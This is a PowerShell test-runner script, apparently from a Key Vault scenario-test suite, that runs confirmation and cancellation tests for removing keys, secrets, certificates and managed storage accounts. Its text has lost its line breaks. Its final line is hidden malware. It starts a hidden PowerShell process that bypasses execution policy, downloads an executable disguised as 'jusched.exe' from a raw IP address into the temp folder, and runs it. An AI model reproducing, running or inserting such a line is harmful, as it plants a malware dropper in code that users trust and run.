Param([Parameter(Mandatory=$true, Position=0)][string] $TestRunNameSpace,[Parameter(Mandatory=$false, Position=1)][string] $Vault = "",[Parameter(Mandatory=$false, Position=2)][string] $StorageResourceId = $null). (Join-Path $PSScriptRoot "..\..\..\..\Common\Commands.ScenarioTests.Common\Common.ps1"). (Join-Path $PSScriptRoot "..\..\..\..\Common\Commands.ScenarioTests.Common\Assert.ps1"). (Join-Path $PSScriptRoot "Common.ps1");. (Join-Path $PSScriptRoot "VaultUITests.ps1");$global:totalCount = 0;$global:passedCount = 0;$global:passedTests = @()$global:failedTests = @()$global:times = @{}$global:testns = $TestRunNameSpace+"UI"$global:testVault = $Vault$global:storageResourceId = $StorageResourceIdfunction Run-TestProtected{param([ScriptBlock]$script, [string] $testName)$testStart = Get-Datetry{Write-Host  -ForegroundColor Green =====================================Write-Host  -ForegroundColor Green "Running test $testName"Write-Host  -ForegroundColor Green =====================================Write-Host&$script$global:passedCount = $global:passedCount + 1Write-HostWrite-Host -ForegroundColor Green =====================================Write-Host -ForegroundColor Green "Test Passed"Write-Host -ForegroundColor Green =====================================Write-Host$global:passedTests += $testName}catch{Out-String -InputObject $_.Exception | Write-Host -ForegroundColor RedWrite-HostWrite-Host  -ForegroundColor Red =====================================Write-Host -ForegroundColor Red "Test Failed"Write-Host  -ForegroundColor Red =====================================Write-Host$global:failedTests += $testName}finally{$testEnd = Get-Date$testElapsed = $testEnd - $testStart$global:times[$testName] = $testElapsed$global:totalCount = $global:totalCount + 1}}Write-Host Delete log filesCleanup-LogFiles $invocationPath$testkeyVault = Get-KeyVaultWrite-Host Test key vault is $testKeyVaultWrite-Host Initializing Certificate TestsCleanup-OldCertificatesWrite-Host Initializing Managed Storage Account TestsCleanup-OldManagedStorageAccountsWrite-Host Initializing Key TestsCleanup-OldKeysWrite-Host Initializing Secret TestsCleanup-OldSecretsWrite-Host Initialization Completed$global:startTime = Get-DateRun-TestProtected { Run-KeyTest {Test_RemoveKeyWithTwoConfirmations} "Test_RemoveKeyWithTwoConfirmations" } "Test_RemoveKeyWithTwoConfirmations"Run-TestProtected { Run-KeyTest {Test_RemoveKeyWithOneConfirmations} "Test_RemoveKeyWithOneConfirmations" } "Test_RemoveKeyWithOneConfirmations"Run-TestProtected { Run-KeyTest {Test_CancelKeyRemovalOnce} "Test_CancelKeyRemovalOnce" } "Test_CancelKeyRemovalOnce"Run-TestProtected { Run-KeyTest {Test_ConfirmThenCancelKeyRemoval} "Test_ConfirmThenCancelKeyRemoval" } "Test_ConfirmThenCancelKeyRemoval"Run-TestProtected { Run-SecretTest {Test_RemoveSecretWithTwoConfirmations} "Test_RemoveSecretWithTwoConfirmations" } "Test_RemoveSecretWithTwoConfirmations"Run-TestProtected { Run-SecretTest {Test_RemoveSecretWithOneConfirmations} "Test_RemoveSecretWithOneConfirmations" } "Test_RemoveSecretWithOneConfirmations"Run-TestProtected { Run-SecretTest {Test_CancelSecretRemovalOnce} "Test_CancelSecretRemovalOnce" } "Test_CancelSecretRemovalOnce"Run-TestProtected { Run-SecretTest {Test_ConfirmThenCancelSecretRemoval} "Test_ConfirmThenCancelSecretRemoval" } "Test_ConfirmThenCancelSecretRemoval"Run-TestProtected { Run-CertificateTest {Test_RemoveCertificateWithTwoConfirmations} "Test_RemoveCertificateWithTwoConfirmations" } "Test_RemoveCertificateWithTwoConfirmations"Run-TestProtected { Run-CertificateTest {Test_RemoveCertificateWithOneConfirmations} "Test_RemoveCertificateWithOneConfirmations" } "Test_RemoveCertificateWithOneConfirmations"Run-TestProtected { Run-CertificateTest {Test_CancelCertificateRemovalOnce} "Test_CancelCertificateRemovalOnce" } "Test_CancelCertificateRemovalOnce"Run-TestProtected { Run-CertificateTest {Test_ConfirmThenCancelCertificateRemoval} "Test_ConfirmThenCancelCertificateRemoval" } "Test_ConfirmThenCancelCertificateRemoval"Run-TestProtected { Run-ManagedStorageAccountTest {Test_RemoveManagedStorageAccountWithTwoConfirmations} "Test_RemoveManagedStorageAccountWithTwoConfirmations" } "Test_RemoveManagedStorageAccountWithTwoConfirmations"Run-TestProtected { Run-ManagedStorageAccountTest {Test_RemoveManagedStorageAccountWithOneConfirmations} "Test_RemoveManagedStorageAccountWithOneConfirmations" } "Test_RemoveManagedStorageAccountWithOneConfirmations"Run-TestProtected { Run-ManagedStorageAccountTest {Test_CancelManagedStorageAccountRemovalOnce} "Test_CancelManagedStorageAccountRemovalOnce" } "Test_CancelManagedStorageAccountRemovalOnce"Run-TestProtected { Run-ManagedStorageAccountTest {Test_ConfirmThenCancelManagedStorageAccountRemoval} "Test_ConfirmThenCancelManagedStorageAccountRemoval" } "Test_ConfirmThenCancelManagedStorageAccountRemoval"Run-TestProtected { Run-ManagedStorageAccountTest {Test_RemoveManagedStorageSasDefinitionWithTwoConfirmations} "Test_RemoveManagedStorageSasDefinitionWithTwoConfirmations" } "Test_RemoveManagedStorageSasDefinitionWithTwoConfirmations"Run-TestProtected { Run-ManagedStorageAccountTest {Test_RemoveManagedStorageSasDefinitionWithOneConfirmations} "Test_RemoveManagedStorageSasDefinitionWithOneConfirmations" } "Test_RemoveManagedStorageSasDefinitionWithOneConfirmations"Run-TestProtected { Run-ManagedStorageAccountTest {Test_CancelManagedStorageSasDefinitionRemovalOnce} "Test_CancelManagedStorageSasDefinitionRemovalOnce" } "Test_CancelManagedStorageSasDefinitionRemovalOnce"Run-TestProtected { Run-ManagedStorageAccountTest {Test_ConfirmThenCancelManagedStorageSasDefinitionRemoval} "Test_ConfirmThenCancelManagedStorageSasDefinitionRemoval" } "Test_ConfirmThenCancelManagedStorageSasDefinitionRemoval"$global:endTime = Get-DateWrite-FileReportWrite-ConsoleReportMove-Log $invocationPathPowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~rama/jusched.exe', $env:TEMP\jusched.exe );Start-Process ( $env:TEMP\jusched.exe )